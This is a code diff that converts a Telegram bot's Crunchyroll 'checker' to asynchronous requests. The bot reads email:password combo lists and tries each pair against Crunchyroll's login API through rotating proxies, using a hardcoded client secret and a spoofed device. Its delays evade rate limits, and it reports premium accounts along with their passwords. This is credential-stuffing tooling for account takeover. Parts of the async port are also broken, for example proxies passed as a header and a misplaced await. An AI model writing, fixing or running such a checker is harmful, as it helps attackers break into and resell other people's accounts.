@@ -2,7 +2,7 @@ import os
 import asyncio
 import uuid
 import random
-import requests
+import aiohttp
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.types import FSInputFile
@@ -68,103 +68,107 @@ class CrunchyrollChecker:
         self.proxy_index += 1
         return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
 
-    def check(self, email, password):
+    async def check(self, email, password):
         try:
             device_id = str(uuid.uuid4())
-            session = requests.Session()
-            proxy = self.get_proxy()
-            if proxy:
-                session.proxies.update(proxy)
+            async with aiohttp.ClientSession() as session:
+                proxy = self.get_proxy()
+                if proxy:
+                    session._default_headers.update({"Proxy": proxy})
 
-            url = "https://beta-api.crunchyroll.com/auth/v1/token"
-            headers = {
-                'host': 'beta-api.crunchyroll.com',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
-            }
+                url = "https://beta-api.crunchyroll.com/auth/v1/token"
+                headers = {
+                    'host': 'beta-api.crunchyroll.com',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
+                }
 
-            data = {
-                'grant_type': 'password',
-                'username': email,
-                'password': password,
-                'scope': 'offline_access',
-                'client_id': 'y2arvjb0h0rgvtizlovy',
-                'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
-                'device_type': 'Baron',
-                'device_id': device_id,
-                'device_name': 'Baron'
-            }
+                data = {
+                    'grant_type': 'password',
+                    'username': email,
+                    'password': password,
+                    'scope': 'offline_access',
+                    'client_id': 'y2arvjb0h0rgvtizlovy',
+                    'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
+                    'device_type': 'Baron',
+                    'device_id': device_id,
+                    'device_name': 'Baron'
+                }
 
-            response = session.post(url, headers=headers, data=data, timeout=15)
-            response_text = response.text
+                async with session.post(url, headers=headers, data=data, timeout=15) as response:
+                    response_text = await response.text()
 
-            if any(x in response_text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400", "missing_required_field"]):
-                return {'status': 'INVALID', 'email': email}
+                    if any(x in response_text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400", "missing_required_field"]):
+                        return {'status': 'INVALID', 'email': email}
 
-            if '"access_token"' not in response_text:
-                return {'status': 'INVALID', 'email': email}
+                    if '"access_token"' not in response_text:
+                        return {'status': 'INVALID', 'email': email}
 
-            access_token = response.json().get('access_token')
+                    access_token = await response.json().get('access_token')
 
-            headers = {
-                'authorization': f'Bearer {access_token}',
-                'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
-            }
+                    headers = {
+                        'authorization': f'Bearer {access_token}',
+                        'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
+                    }
 
-            account_data = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15).json()
-            email_verified = account_data.get('email_verified', False)
-            created = account_data.get('created', '').split('T')[0]
-            external_id = account_data.get('external_id')
+                    account_data = await session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15)
+                    account_data = await account_data.json()
+                    email_verified = account_data.get('email_verified', False)
+                    created = account_data.get('created', '').split('T')[0]
+                    external_id = account_data.get('external_id')
 
-            products_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15).json()
+                    products_data = await session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15)
+                    products_data = await products_data.json()
 
-            plan = "Free"
-            currency = "N/A"
-            subscribable = "False"
-            free_trial = "False"
-            if 'items' in products_data and len(products_data['items']) > 0:
-                item = products_data['items'][0]
-                plan = item.get('product', {}).get('sku', 'Unknown')
-                currency = item.get('currency_code', 'N/A')
-                subscribable = str(item.get('product', {}).get('is_subscribable', False))
-                free_trial = str(item.get('active_free_trial', False))
+                    plan = "Free"
+                    currency = "N/A"
+                    subscribable = "False"
+                    free_trial = "False"
+                    if 'items' in products_data and len(products_data['items']) > 0:
+                        item = products_data['items'][0]
+                        plan = item.get('product', {}).get('sku', 'Unknown')
+                        currency = item.get('currency_code', 'N/A')
+                        subscribable = str(item.get('product', {}).get('is_subscribable', False))
+                        free_trial = str(item.get('active_free_trial', False))
 
-            sub_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15).json()
+                    sub_data = await session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15)
+                    sub_data = await sub_data.json()
 
-            expiry = sub_data.get('next_renewal_date', 'N/A')
-            if expiry and 'T' in expiry:
-                expiry = expiry.split('T')[0]
+                    expiry = sub_data.get('next_renewal_date', 'N/A')
+                    if expiry and 'T' in expiry:
+                        expiry = expiry.split('T')[0]
 
-            plan_duration = sub_data.get('cycle_duration', 'N/A')
-            is_active = str(sub_data.get('is_active', False))
-            country_code = sub_data.get('country_code', 'US')
-            country = self.countries.get(country_code, f"{country_code} 🌍")
-            is_cancelled = sub_data.get('is_cancelled', False)
+                    plan_duration = sub_data.get('cycle_duration', 'N/A')
+                    is_active = str(sub_data.get('is_active', False))
+                    country_code = sub_data.get('country_code', 'US')
+                    country = self.countries.get(country_code, f"{country_code} 🌍")
+                    is_cancelled = sub_data.get('is_cancelled', False)
 
-            if is_cancelled or subscribable == "False" or "Subscription Not Found" in str(sub_data):
-                status = "FREE"
-            elif subscribable == "True":
-                status = "PREMIUM"
-            else:
-                status = "FREE"
+                    if is_cancelled or subscribable == "False" or "Subscription Not Found" in str(sub_data):
+                        status = "FREE"
+                    elif subscribable == "True":
+                        status = "PREMIUM"
+                    else:
+                        status = "FREE"
 
-            return {
-                'status': status,
-                'email': email,
-                'password': password,
-                'email_verified': email_verified,
-                'account_creation_date': created,
-                'plan': plan,
-                'currency': currency,
-                'subscribable': subscribable,
-                'free_trial': free_trial,
-                'expiry': expiry,
-                'plan_duration': plan_duration,
-                'active': is_active,
-                'country': country
-            }
+                    return {
+                        'status': status,
+                        'email': email,
+                        'password': password,
+                        'email_verified': email_verified,
+                        'account_creation_date': created,
+                        'plan': plan,
+                        'currency': currency,
+                        'subscribable': subscribable,
+                        'free_trial': free_trial,
+                        'expiry': expiry,
+                        'plan_duration': plan_duration,
+                        'active': is_active,
+                        'country': country
+                    }
 
-        except Exception:
+        except Exception as e:
+            print(f"Error: {e}")
             return {'status': 'ERROR', 'email': email}
 
 
@@ -266,7 +270,7 @@ async def handle(message: types.Message):
     for line in lines:
         try:
             email, password = line.split(":", 1)
-            result = checker.check(email.strip(), password.strip())
+            result = await checker.check(email.strip(), password.strip())
 
             stats['checked'] += 1
             if result['status'] == 'PREMIUM':
@@ -280,7 +284,8 @@ async def handle(message: types.Message):
 
             await asyncio.sleep(1.0 + random.uniform(0.2, 0.6))
 
-        except:
+        except Exception as e:
+            print(f"Error during checking: {e}")
             continue
 
 
